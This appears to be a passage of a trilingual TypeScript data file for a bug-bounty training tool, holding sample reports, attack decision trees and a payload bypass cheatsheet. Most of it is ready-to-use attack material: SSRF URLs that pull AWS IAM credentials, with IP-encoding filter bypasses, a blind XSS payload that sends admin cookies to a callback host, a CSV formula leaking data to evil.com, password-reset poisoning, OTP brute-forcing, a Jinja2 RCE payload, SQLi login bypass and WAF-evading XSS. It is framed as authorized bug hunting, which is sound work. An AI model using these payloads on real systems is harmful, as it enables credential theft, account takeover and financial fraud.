Insecure Direct Object Reference (IDOR) / Broken Access Control (CWE-639)

**Severity:**
High / Critical (CVSS 8.8: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

**Summary:**
The REST API endpoint \`/api/v2/tenants/{tenant_id}/invoices/{invoice_id}\` lacks proper object-level authorization checks. A low-privileged authenticated user from Tenant A can view, edit, and delete billing records belonging to Tenant B by simply substituting the target IDs.

**Steps to Reproduce:**
1. Create Account A belonging to Tenant A (\`tenant_id: 101\`) and create an invoice (\`invoice_id: 5041\`).
2. Create Account B belonging to Tenant B (\`tenant_id: 202\`).
3. Using Account B's JWT token, send a PATCH request modifying Tenant A's invoice:
   \`\`\`http
   PATCH /api/v2/tenants/101/invoices/5041 HTTP/1.1
   Host: api.target.com
   Authorization: Bearer <ACCOUNT_B_TOKEN>
   Content-Type: application/json

   {
     "status": "paid",
     "amount_due": 0,
     "payout_recipient": "attacker@evil.com"
   }
   \`\`\`
4. Observe the response \`200 OK\` with the updated invoice.
5. In Account A's dashboard, verify that the invoice has been unauthorizedly altered.

**Impact:**
Complete loss of data integrity and confidentiality across multi-tenant boundaries. An attacker can tamper with financial transactions, alter payment recipients, or wipe out historical records across the enterprise.

**Remediation:**
Enforce database-level tenant isolation (e.g. \`WHERE tenant_id = current_user.tenant_id AND id = :invoice_id\`) rather than trusting client-provided tenant IDs.`,
  },
  {
    id: "report-ssrf-cloud",
    vulnType: "SSRF to Cloud Metadata (AWS/GCP)",
    title: {
      en: "Server-Side Request Forgery (SSRF) via Webhook Validation Endpoint Leading to AWS IAM Role Credential Extraction",
      simple: "SSRF to Steal Cloud Server Secret Keys",
      hi: "वेबहुक वैलिडेशन में SSRF द्वारा AWS IAM रोल्स और क्लाउड क्रेडेंशियल्स की चोरी",
    },
    severity: "Critical (P1)",
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
    cvssScore: 9.3,
    escalatorTip: {
      en: "Do NOT just show a DNS hit on Burp Collaborator. A Collaborator ping without internal data is usually marked P4/Informative. Query http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> and redact the secret key in your screenshot. Proving IAM credential exposure turns this into a maximum critical payout ($10,000+).",
      simple: "Don't just ping your server. Query the internal cloud IP (169.254.169.254) and show the AWS IAM role name. That proves total server compromise.",
      hi: "सिर्फ Collaborator पर पिंग न दिखाएं। इंटरनल क्लाउड IP `169.254.169.254` को क्वेरी करके IAM रोल का नाम और क्रेडेंशियल का स्क्रीनशॉट दें (सीक्रेट की को ब्लर करें)। यह 100% P1 कन्फर्म करता है।",
    },
    sampleReport: `**Vulnerability Title:**
Server-Side Request Forgery (SSRF) via Webhook Validation Endpoint Leading to AWS IAM Role Credential Extraction

**Vulnerability Type:**
Server-Side Request Forgery (SSRF) (CWE-918)

**Severity:**
Critical (CVSS 9.3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)

**Summary:**
The webhook testing functionality at \`POST /api/webhooks/test\` permits arbitrary URL fetching without filtering local link-local addresses. An attacker can query the AWS EC2 instance metadata service (IMDS) and extract temporary IAM security credentials assigned to the worker node.

**Steps to Reproduce:**
1. Navigate to Settings -> Webhooks -> Test Endpoint.
2. Submit the following payload in the webhook test field:
   \`\`\`json
   {
     "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
   }
   \`\`\`
3. The server responds with the attached IAM role name: \`Production-Eks-Worker-Role\`.
4. Send a follow-up request to fetch the security tokens:
   \`\`\`json
   {
     "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/Production-Eks-Worker-Role"
   }
   \`\`\`
5. Observe the response containing \`AccessKeyId\`, \`SecretAccessKey\`, and \`Token\`.

**Impact:**
An external attacker can access the company's AWS cloud infrastructure using the extracted IAM credentials, enabling read and write access to internal S3 buckets, RDS databases, and EC2 instances.

**Remediation:**
1. Require IMDSv2 with token hop limit 1.
2. Implement a strict egress IP firewall rejecting requests to \`169.254.169.254\`, \`10.0.0.0/8\`, \`172.16.0.0/12\`, and \`192.168.0.0/16\`.`,
  },
  {
    id: "report-race-condition",
    vulnType: "Race Condition / Business Logic Flaw",
    title: {
      en: "Race Condition on Gift Card & Coupon Redemption Allowing Unlimited Balance Multiplication",
      simple: "Spend the Same Coupon Multiple Times via Rapid Requests",
      hi: "रेस कंडीशन: एक ही कूपन कोड को एक साथ भुनाकर अनलिमिटेड बैलेंस प्राप्त करना",
    },
    severity: "High (P2)",
    cvssVector: "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
    cvssScore: 7.5,
    escalatorTip: {
      en: "Use HTTP/2 Single-Packet Attack in Burp Repeater. Send 20 parallel requests in the exact same TCP packet. Demonstrating that a $50 coupon redeemed 15 times generates $750 in wallet balance proves direct financial loss, guaranteeing high priority triage.",
      simple: "Send 20 requests at the exact same millisecond using Burp HTTP/2. Show your account balance growing repeatedly.",
      hi: "Burp Repeater में HTTP/2 Single-Packet Attack का इस्तेमाल करें। एक साथ 20 रिक्वेस्ट भेजकर दिखाएं कि $50 का कूपन 15 बार रिडीम होकर $750 बैलेंस बना देता है। यह डायरेक्ट वित्तीय नुकसान साबित करता है।",
    },
    sampleReport: `**Vulnerability Title:**
Race Condition on Gift Card & Coupon Redemption Allowing Unlimited Balance Multiplication

**Vulnerability Type:**
Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') (CWE-362)

**Severity:**
High (CVSS 7.5: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N)

**Summary:**
The promotional coupon redemption endpoint at \`POST /api/wallet/redeem\` does not implement database-level row locking. By sending concurrent requests in a single TCP window, an attacker can bypass the single-use coupon restriction and redeem the coupon multiple times simultaneously.

**Steps to Reproduce:**
1. Obtain a valid single-use promotional coupon code (e.g. \`SAVE50\` for $50 credit).
2. Intercept the redemption request in Burp Suite:
   \`\`\`http
   POST /api/wallet/redeem HTTP/2
   Host: target.com
   Authorization: Bearer <USER_TOKEN>
   Content-Type: application/json

   {"code": "SAVE50"}
   \`\`\`
3. Send to Burp Repeater and create a tab group with 20 copies of this request.
4. Select "Send group in parallel (single-packet attack)".
5. Observe that 14 out of 20 requests return \`200 OK: Coupon redeemed successfully\`.
6. Refresh the account wallet: balance reflects $700 instead of the allowed $50.

**Impact:**
Direct financial loss for the platform through unauthorized balance generation and fraud.

**Remediation:**
Wrap the coupon validation and balance update in an atomic database transaction with pessimistic locking (\`SELECT ... FOR UPDATE\`) or utilize an atomic Redis token consumption pattern.`,
  },
  {
    id: "report-blind-xss",
    vulnType: "Blind / Stored XSS to Admin Portal",
    title: {
      en: "Blind Stored XSS in Support Ticket System Leading to Internal Admin Session Hijacking",
      simple: "XSS that Triggers Inside the Employee / Admin Dashboard",
      hi: "सपोर्ट टिकट में ब्लाइंड स्टोर्ड XSS द्वारा एडमिन सेशन की हाईजैकिंग",
    },
    severity: "High (P2)",
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N",
    cvssScore: 8.2,
    escalatorTip: {
      en: "Do NOT just submit `<script>alert(1)</script>`. Use an XSS Hunter / bxss payload that fires on the admin portal. When the admin opens the ticket, collect the admin's internal URL, IP, DOM screenshot, and cookies. Proving access to the internal backoffice portal elevates this to P1/P2.",
      simple: "Use an XSS Hunter payload that logs the admin's screen and internal URL when they view your ticket.",
      hi: "सिर्फ `alert(1)` न भेजें। XSS Hunter पेलोड का इस्तेमाल करें जो एडमिन के पोर्टल खोलते ही उनका इंटरनल URL, IP और स्क्रीनशॉट कैप्चर कर ले। इससे इंटरनल बैकऑफिस एक्सेस साबित होता है।",
    },
    sampleReport: `**Vulnerability Title:**
Blind Stored XSS in Support Ticket System Leading to Internal Admin Session Hijacking

**Vulnerability Type:**
Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (CWE-79)

**Severity:**
High / Critical (CVSS 8.2: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N)

**Summary:**
The support ticket submission form at \`POST /api/support/tickets\` fails to sanitize user-supplied HTML entities in the \`subject\` and \`message\` parameters. When an internal support administrator views the ticket in their private backoffice dashboard (\`https://admin-internal.target.com\`), the script executes in the context of the privileged admin session.

**Steps to Reproduce:**
1. Navigate to the contact support form as a normal user.
2. Submit a ticket with the following payload in the subject line:
   \`\`\`html
   "><script src="https://yourname.xss.ht"></script>
   \`\`\`
3. Wait for the ticket to be triaged by customer support staff.
4. Check your XSS callback logs: a hit is received from \`https://internal-desk.target.internal/tickets/view?id=9021\`.
5. The callback report captures the full DOM, admin cookies, and local session tokens.

**Impact:**
Arbitrary script execution inside the internal corporate portal. An attacker can perform administrative actions, access customer PII, or pivot deeper into internal systems.

**Remediation:**
Implement context-aware HTML entity encoding on output within the admin portal and configure a restrictive Content-Security-Policy (CSP) that disallows unsafe-inline and untrusted script sources.`,
  },
];

// ── 7. VISUAL ATTACK DECISION TREES ("Agar yeh dikhe toh kya karein?") ────────
export interface DecisionTreeNode {
  condition: Record<Lang, string>;
  action: Record<Lang, string>;
  payloadOrCommand?: string;
  positiveIndicator: Record<Lang, string>;
  payoutImpact: string;
}

export interface AttackDecisionTree {
  id: string;
  featureName: Record<Lang, string>;
  emoji: string;
  triggerContext: Record<Lang, string>;
  steps: DecisionTreeNode[];
}

export const ATTACK_DECISION_TREES: AttackDecisionTree[] = [
  {
    id: "tree-password-reset",
    featureName: {
      en: "Password Reset & 2FA Flow",
      simple: "Forgot Password & OTP Features",
      hi: "पासवर्ड रीसेट और 2FA फ़्लो",
    },
    emoji: "🔐",
    triggerContext: {
      en: "Whenever you encounter a 'Forgot Password', 'Verify Email', or 'SMS OTP' screen.",
      simple: "Any page where a user requests a code or link to reset password.",
      hi: "जब भी आपको 'Forgot Password', 'Email Verification' या 'SMS OTP' स्क्रीन दिखे।",
    },
    steps: [
      {
        condition: {
          en: "Password reset sends an email with a reset link",
          simple: "Website sends reset link to your email",
          hi: "वेबसाइट रीसेट लिंक ईमेल पर भेजती है",
        },
        action: {
          en: "Intercept request in Burp and inject `Host: evil.com` and `X-Forwarded-Host: evil.com` headers.",
          simple: "Change Host header in Burp to evil.com.",
          hi: "Burp में रिक्वेस्ट रोकें और `Host: evil.com` तथा `X-Forwarded-Host: evil.com` हेडर जोड़ें।",
        },
        payloadOrCommand: `POST /api/auth/forgot-password HTTP/1.1\nHost: evil.com\nX-Forwarded-Host: evil.com\n\n{"email": "victim@target.com"}`,
        positiveIndicator: {
          en: "Email arrives with reset link pointing to `evil.com/reset?token=XYZ` (Password Reset Poisoning).",
          simple: "The email has link with evil.com in it.",
          hi: "ईमेल में रीसेट लिंक `evil.com/reset?token=XYZ` बनकर आता है (हॉस्ट हेडर प्वाइज़निंग)।",
        },
        payoutImpact: "P1 Critical ($3,000 – $10,000)",
      },
      {
        condition: {
          en: "Verification requires a 4-digit or 6-digit OTP code",
          simple: "Site asks for 4 or 6 digit number",
          hi: "वेरिफिकेशन के लिए 4 या 6 डिजिट का OTP मांगा जाता है",
        },
        action: {
          en: "Test rate limit on `/api/verify-otp`. Send 1,000 rapid guesses via Turbo Intruder or Burp Intruder.",
          simple: "Send 1,000 OTP guesses fast to test if it blocks you.",
          hi: "Burp Intruder या Turbo Intruder से 1,000 OTP तेजी से भेजकर रेट-लिमिट चेक करें।",
        },
        payloadOrCommand: `// Turbo Intruder Python snippet:\nfor i in range(10000):\n    engine.queue(target.req, [str(i).zfill(4)])`,
        positiveIndicator: {
          en: "No 429 Too Many Requests status or CAPTCHA trigger after 500+ attempts; correct code resets password.",
          simple: "Server doesn't block you after 100+ attempts.",
          hi: "500+ रिक्वेस्ट के बाद भी 429 ब्लॉक या CAPTCHA नहीं आता; सही OTP मिलने पर पासवर्ड रीसेट हो जाता है।",
        },
        payoutImpact: "P1 Critical ($2,500 – $6,000)",
      },
      {
        condition: {
          en: "Client-side validates OTP response",
          simple: "Browser checks if OTP is right or wrong",
          hi: "ब्राउज़र खुद चेक करता है कि OTP सही है या गलत",
        },
        action: {
          en: "Intercept the server response in Burp Proxy (`Do intercept -> Response to this request`) on a wrong OTP.",
          simple: "Intercept response of wrong OTP and edit error to success.",
          hi: "गलत OTP भेजकर Burp में सर्वर का Response इंटरसेप्ट करें।",
        },
        payloadOrCommand: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"success": true, "verified": true, "token": "temp_token"}`,
        positiveIndicator: {
          en: "UI advances to 'Enter New Password' step and successfully saves the new password on the server.",
          simple: "Website lets you type a new password even with wrong code.",
          hi: "UI सीधे 'New Password' स्क्रीन पर ले जाता है और नया पासवर्ड सेव हो जाता है (रिस्पॉन्स मैनिपुलेशन)।",
        },
        payoutImpact: "P1 Critical ($3,000 – $8,000)",
      },
    ],
  },
  {
    id: "tree-file-upload",
    featureName: {
      en: "File & Avatar Upload Endpoint",
      simple: "Upload Profile Picture / Document",
      hi: "फ़ाइल और प्रोफाइल फोटो अपलोड एंडपॉइंट",
    },
    emoji: "📁",
    triggerContext: {
      en: "Any place where users can upload an avatar, resume, invoice PDF, or CSV file.",
      simple: "Any button that lets you pick a file from your computer.",
      hi: "जहाँ भी प्रोफाइल फोटो, रिज्यूमे, इनवॉइस या CSV फ़ाइल अपलोड करने का ऑप्शन हो।",
    },
    steps: [
      {
        condition: {
          en: "System accepts image formats (PNG, JPG, SVG)",
          simple: "Upload accepts SVG image",
          hi: "सिस्टम इमेज फ़ाइल्स (PNG, JPG, SVG) स्वीकार करता है",
        },
        action: {
          en: "Upload an SVG file containing JavaScript inside `<svg><script>alert(document.domain)</script></svg>`.",
          simple: "Upload SVG file with script inside it.",
          hi: "JavaScript युक्त SVG फ़ाइल अपलोड करें।",
        },
        payloadOrCommand: `<?xml version="1.0" standalone="no"?>\n<svg xmlns="http://www.w3.org/2000/svg">\n  <script>alert(document.domain)</script>\n</svg>`,
        positiveIndicator: {
          en: "Direct link to image executes JavaScript in browser on main target domain.",
          simple: "Opening uploaded picture URL shows popup alert.",
          hi: "अपलोड की गई इमेज के डायरेक्ट लिंक पर क्लिक करने पर ब्राउज़र में अलर्ट रन होता है।",
        },
        payoutImpact: "P2 High ($1,000 – $3,500)",
      },
      {
        condition: {
          en: "Upload filename is reflected on server or stored in local disk",
          simple: "Site saves file with its original name",
          hi: "सर्वर फ़ाइल को उसके ओरिजिनल नाम से डिस्क पर सेव करता है",
        },
        action: {
          en: "Test Path Traversal in the `filename` parameter using `../../../../var/www/shell.png`.",
          simple: "Change filename to ../../shell.php in Burp.",
          hi: "Burp में `filename` पैरामीटर में `../../../../tmp/test` लगाकर पाथ ट्रैवर्सल टेस्ट करें।",
        },
        payloadOrCommand: `Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/test.txt"\nContent-Type: text/plain\n\ntest_payload`,
        positiveIndicator: {
          en: "File is written outside the intended upload directory, accessible at root path.",
          simple: "File gets placed in different server folder.",
          hi: "फ़ाइल अपलोड फोल्डर से बाहर सर्वर रूट या मनचाहे पाथ पर सेव हो जाती है।",
        },
        payoutImpact: "P1 Critical ($3,500 – $10,000)",
      },
      {
        condition: {
          en: "Site parses Excel/CSV files (e.g. bulk contact or inventory import)",
          simple: "Site imports CSV or Excel files",
          hi: "साइट CSV या Excel फ़ाइल इम्पोर्ट करती है",
        },
        action: {
          en: "Inject CSV Injection / Formula Injection commands starting with `=`, `@`, or `+`.",
          simple: "Put Excel formula inside the spreadsheet.",
          hi: "CSV की किसी सेल में formula injection `=cmd|' /C calc'!A0` या `=HYPERLINK()` डालें।",
        },
        payloadOrCommand: `=HYPERLINK("http://evil.com/leak?d="&A1, "Click for Report")`,
        positiveIndicator: {
          en: "Admin downloading the exported sheet executes malicious formula or leaks cell data via HTTP request.",
          simple: "Spreadsheet executes formula when opened by staff.",
          hi: "शीट डाउनलोड करने पर एडमिन के सिस्टम पर फ़ॉर्मूला एग्जीक्यूट होता है या डेटा लीक होता है।",
        },
        payoutImpact: "P3/P2 ($500 – $2,000)",
      },
    ],
  },
  {
    id: "tree-graphql",
    featureName: {
      en: "GraphQL Endpoint (/graphql)",
      simple: "GraphQL APIs",
      hi: "ग्राफ़-QL एंडपॉइंट्स (/graphql)",
    },
    emoji: "🕸️",
    triggerContext: {
      en: "Whenever network traffic sends requests to `/graphql`, `/api/graphql`, or `query { ... }` syntax.",
      simple: "Any web request that has 'query' or 'mutation' inside it.",
      hi: "जब भी नेटवर्क ट्रैफिक में `/graphql` एंडपॉइंट या `query { ... }` सिंटैक्स दिखे।",
    },
    steps: [
      {
        condition: {
          en: "GraphQL endpoint is reachable",
          simple: "GraphQL is available",
          hi: "GraphQL एंडपॉइंट चालू है",
        },
        action: {
          en: "Send an introspection query to dump the entire database schema, queries, and hidden mutations.",
          simple: "Ask GraphQL to send you the entire internal database map.",
          hi: "इंट्रोस्पेक्शन क्वेरी भेजकर पूरा स्कीमा, प्राइवेट क्वेरीज़ और म्यूटेशन्स डंप करें।",
        },
        payloadOrCommand: `POST /graphql HTTP/1.1\nContent-Type: application/json\n\n{"query": "{__schema{types{name,fields{name,args{name}}}}}"}`,
        positiveIndicator: {
          en: "Response returns full schema with internal admin mutations like `deleteUser`, `updateRole`, `debugLog`.",
          simple: "Server responds with huge list of all secret queries and admin functions.",
          hi: "रिस्पॉन्स में सारे प्राइवेट म्यूटेशन्स जैसे `updateUserRole`, `adminResetPassword` साफ दिखाई देते हैं।",
        },
        payoutImpact: "P3 Info / Stepping Stone to P1",
      },
      {
        condition: {
          en: "Introspection is disabled by developer",
          simple: "Introspection is blocked",
          hi: "डेवलपर ने इंट्रोस्पेक्शन बंद कर रखा है",
        },
        action: {
          en: "Use GraphQL Field Suggestion brute-forcing via `clairvoyance` tool to reconstruct the schema blindly.",
          simple: "Use clairvoyance tool to guess field names one by one.",
          hi: "`clairvoyance` टूल से फ़ील्ड सजेशन एरर्स का इस्तेमाल करके पूरा स्कीमा ब्लाइंडली रीकन्स्ट्रक्ट करें।",
        },
        payloadOrCommand: `clairvoyance -o schema.json https://target.com/graphql`,
        positiveIndicator: {
          en: "Tool reconstructs types from server hints like: 'Did you mean user or userProfile?'.",
          simple: "Tool guesses all endpoints from error messages.",
          hi: "सर्वर के एरर हिंट्स से टूल पूरा स्कीमा तैयार कर देता है।",
        },
        payoutImpact: "P2/P1 Pathway ($1,500 – $5,000)",
      },
      {
        condition: {
          en: "Query batching is supported (array of queries)",
          simple: "Server accepts multiple queries at once",
          hi: "सर्वर एक साथ कई क्वेरीज़ की ऐरे स्वीकार करता है",
        },
        action: {
          en: "Bypass rate limits by packing 100 OTP/password attempts in a single JSON array `[{query:...}, {query:...}]`.",
          simple: "Send 100 login attempts in one single request.",
          hi: "एक ही JSON ऐरे में 100 क्वेरीज़ डालकर रेट-लिमिट बाईपास करें।",
        },
        payloadOrCommand: `[{"query":"mutation{login(user:\\"admin\\",pass:\\"1234\\"){token}}"},{"query":"mutation{login(user:\\"admin\\",pass:\\"1235\\"){token}}"}]`,
        positiveIndicator: {
          en: "Server processes all 100 mutations in 1 single HTTP request without triggering rate limits.",
          simple: "Server tests all passwords in one click without blocking.",
          hi: "सर्वर बिना किसी रेट-लिमिट के एक ही HTTP रिक्वेस्ट में 100 म्यूटेशन्स प्रोसेस कर देता है।",
        },
        payoutImpact: "P2 High ($2,000 – $5,000)",
      },
    ],
  },
  {
    id: "tree-checkout",
    featureName: {
      en: "Payment, Cart & Checkout Flows",
      simple: "Online Shopping & Checkout",
      hi: "पेमेंट, कार्ट और चेकआउट फ़्लो",
    },
    emoji: "💳",
    triggerContext: {
      en: "E-commerce carts, premium subscription upgrades, credit purchases, or token balances.",
      simple: "Any screen where money or coins are paid.",
      hi: "जहाँ भी ऑनलाइन पेमेंट, प्रीमियम प्लान, वॉलेट बैलेंस या शॉपिंग कार्ट हो।",
    },
    steps: [
      {
        condition: {
          en: "User selects item quantity in cart",
          simple: "Cart has number of items",
          hi: "कार्ट में आइटम की मात्रा (quantity) चुनी जाती है",
        },
        action: {
          en: "Intercept request in Burp and change `quantity` to `-1`, `0`, or `0.01`.",
          simple: "Change quantity to negative number like -1.",
          hi: "Burp में `quantity` को बदलकर `-1`, `0` या `0.001` करके भेजें।",
        },
        payloadOrCommand: `POST /api/cart/update HTTP/1.1\n\n{"item_id": 99, "quantity": -1, "price": 100}`,
        positiveIndicator: {
          en: "Total cart sum becomes negative or drops to $0, allowing free checkout or crediting money to account.",
          simple: "Cart total becomes $0 or negative.",
          hi: "कार्ट का कुल योग $0 या नेगेटिव हो जाता है और फ्री में ऑर्डर प्लेस हो जाता है।",
        },
        payoutImpact: "P1 Critical ($3,000 – $10,000)",
      },
      {
        condition: {
          en: "Payment gateway supports multiple currencies (USD, INR, JPY)",
          simple: "Store supports different currencies",
          hi: "पेमेंट गेटवे में अलग-अलग करेंसी (USD, INR, JPY) सपोर्टेड हैं",
        },
        action: {
          en: "Add an item in USD ($100), tamper currency code to JPY (Japanese Yen has no decimals, ¥100 ≈ $0.65).",
          simple: "Change currency from USD to JPY in Burp.",
          hi: "करेंसी को USD से बदलकर JPY करें (¥100 की कीमत $1 से भी कम होती है)।",
        },
        payloadOrCommand: `POST /api/checkout/pay HTTP/1.1\n\n{"order_id": 881, "amount": 100, "currency": "JPY"}`,
        positiveIndicator: {
          en: "Order for a $100 product is completed by charging only 100 Yen ($0.65).",
          simple: "You get a $100 product for less than $1.",
          hi: "$100 का प्रोडक्ट सिर्फ 100 येन (लगभग ₹55) में प्रोसेस हो जाता है (करेंसी आर्बिट्रेज)।",
        },
        payoutImpact: "P1 Critical ($2,500 – $7,500)",
      },
    ],
  },
];

// ── 8. HIGH-YIELD PAYLOADS & BYPASS CHEATSHEET ──────────────────────────────
export interface HighYieldPayload {
  id: string;
  category: "ssrf" | "xss" | "sqli" | "ssti" | "redirect";
  name: Record<Lang, string>;
  targetEnv: string;
  payload: string;
  whyItBypasses: Record<Lang, string>;
}

export const HIGH_YIELD_PAYLOADS: HighYieldPayload[] = [
  {
    id: "ssrf-aws-ipv6",
    category: "ssrf",
    name: {
      en: "AWS IMDSv1 IPv6 Link-Local Bypass",
      simple: "AWS Metadata IPv6 Bypass",
      hi: "AWS मेटाडेटा IPv6 लिंक-लोकल बाईपास",
    },
    targetEnv: "AWS EC2 / EKS with IPv6 enabled",
    payload: "http://[fd00:ec2::254]/latest/meta-data/iam/security-credentials/",
    whyItBypasses: {
      en: "Most naive regex filters only check for '169.254.169.254' IPv4 strings and completely ignore the official AWS IPv6 metadata address.",
      simple: "Websites block 169.254.169.254 but forget AWS has an IPv6 address for the same thing.",
      hi: "ज्यादातर फ़िल्टर सिर्फ '169.254.169.254' IPv4 ब्लॉक करते हैं और AWS के आधिकारिक IPv6 एड्रेस को भूल जाते हैं।",
    },
  },
  {
    id: "ssrf-decimal-ip",
    category: "ssrf",
    name: {
      en: "Dword / Decimal IP Representation",
      simple: "Decimal Number IP Address",
      hi: "डेसिमल IP रिप्रजेंटेशन (2852039166)",
    },
    targetEnv: "Linux / cURL / Python requests",
    payload: "http://2852039166/latest/meta-data/",
    whyItBypasses: {
      en: "2852039166 is the integer equivalent of 169.254.169.254. Linux network sockets automatically translate this without matching string filters.",
      simple: "The number 2852039166 is actually 169.254.169.254 written as a single integer number.",
      hi: "2852039166 असल में 169.254.169.254 का इंटीजर रूप है। लिनक्स कर्नल इसे सीधे कन्वर्ट कर लेता है।",
    },
  },
  {
    id: "ssrf-hex-ip",
    category: "ssrf",
    name: {
      en: "Hexadecimal IP Representation",
      simple: "Hexadecimal IP Address",
      hi: "हेक्साडेसिमल IP (0xa9.0xfe.0xa9.0xfe)",
    },
    targetEnv: "Node.js / Go / Nginx Upstream",
    payload: "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/",
    whyItBypasses: {
      en: "Bypasses literal dot-decimal string matching while remaining RFC-compliant for URL resolvers.",
      simple: "Bypasses filters looking for normal numbers.",
      hi: "यह सामान्य डॉट-डेसिमल फ़िल्टर को बाईपास करता है और सॉकेट्स में मान्य रहता है।",
    },
  },
  {
    id: "xss-polyglot-ultimate",
    category: "xss",
    name: {
      en: "Ahmed's Universal Context-Breaking XSS Polyglot",
      simple: "Universal XSS Polyglot",
      hi: "यूनिवर्सल XSS पॉलीग्लॉट (सभी टैग्स को ब्रेक करने वाला)",
    },
    targetEnv: "HTML / Attribute / JavaScript Contexts",
    payload: `jaVasCript:/*-/*\`/*\\'\`/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`,
    whyItBypasses: {
      en: "Breaks out of script tags, style blocks, textarea fields, HTML attributes, and javascript strings simultaneously.",
      simple: "Escapes from inside inputs, scripts, and textareas at the same time.",
      hi: "यह एक साथ `<script>`, `<style>`, `<textarea>` और HTML अटरीब्यूट्स से बाहर निकलकर अलर्ट ट्रिगर करता है।",
    },
  },
  {
    id: "xss-svg-autofocus",
    category: "xss",
    name: {
      en: "WAF-Bypassing SVG Onfocus Polyglot",
      simple: "SVG Onfocus No-Click XSS",
      hi: "WAF-बाईपासिंग SVG Onfocus XSS",
    },
    targetEnv: "Cloudflare / Akamai protected fields",
    payload: `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
    whyItBypasses: {
      en: "Does not use blocked words like `onload`, `onerror`, or `<script>`, evading conventional signature WAF rules.",
      simple: "Avoids words like onload or onerror so firewalls don't block it.",
      hi: "यह `onload`, `onerror` या `<script>` जैसे ब्लॉक शब्दों का उपयोग नहीं करता, जिससे WAF पकड़ नहीं पाता।",
    },
  },
  {
    id: "sqli-auth-bypass",
    category: "sqli",
    name: {
      en: "Universal SQLi Auth Bypass with Comment Polyglot",
      simple: "Universal Login Bypass SQLi",
      hi: "यूनिवर्सल SQLi लॉगिन बाईपास",
    },
    targetEnv: "MySQL / PostgreSQL / SQLite Login Fields",
    payload: `' OR 1=1 LIMIT 1;-- -`,
    whyItBypasses: {
      en: "Forces the query condition to evaluate true and limits the result to the first row (frequently the admin account ID 1).",
      simple: "Forces the database to log you in as the first user (usually admin).",
      hi: "क्वेरी को हमेशा ट्रू करता है और पहली पंक्ति (अक्सर एडमिन अकाउंट) रिटर्न करता है।",
    },
  },
  {
    id: "ssti-jinja2-rce",
    category: "ssti",
    name: {
      en: "Jinja2 / Python 3 Sandbox Escape RCE",
      simple: "Python Jinja2 RCE Payload",
      hi: "Jinja2 / Python 3 सैंडबॉक्स एस्केप RCE",
    },
    targetEnv: "Flask / Python Template Engines",
    payload: `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
    whyItBypasses: {
      en: "Traverses through Flask request application globals to access builtins, executing system commands without directly naming blocked primitives.",
      simple: "Accesses Python's internal command runner through the web request object.",
      hi: "Flask रिक्वेस्ट ऑब्जेक्ट के ग्लोबल्स से डायरेक्ट `os.popen` रन करके सर्वर कमांड चलाता है।",
    },
  },
  {
    id: "redirect-backslash-slash",
    category: "redirect",
    name: {
      en: "Double Slash / Backslash Chrome/Firefox Bypass",
      simple: "Open Redirect Slash Bypass",
      hi: "डबल स्लैश / बैकस्लैश ओपन रीडायरेक्ट बाईपास",
    },
    targetEnv: "URL / Login redirection params",
    payload: `https://target.com/login?redirect_to=///attacker.com`,
    whyItBypasses: {
      en: "Triple slash `///` passes naive `url.startsWith('http')` or `url.startsWith('/')` validations while browsers normalize it to protocol-relative `//attacker.com`.",
      simple: "Three slashes fool the server check, but the browser treats it as a domain redirect.",
      hi: "तीन स्लैश `///` सर्वर-साइड लोकल पाथ चेक को धोखा देते हैं, लेकिन ब्राउज़र इसे `//attacker.com` समझकर रीडायरेक्ट कर देता है।",
    },
  },
];


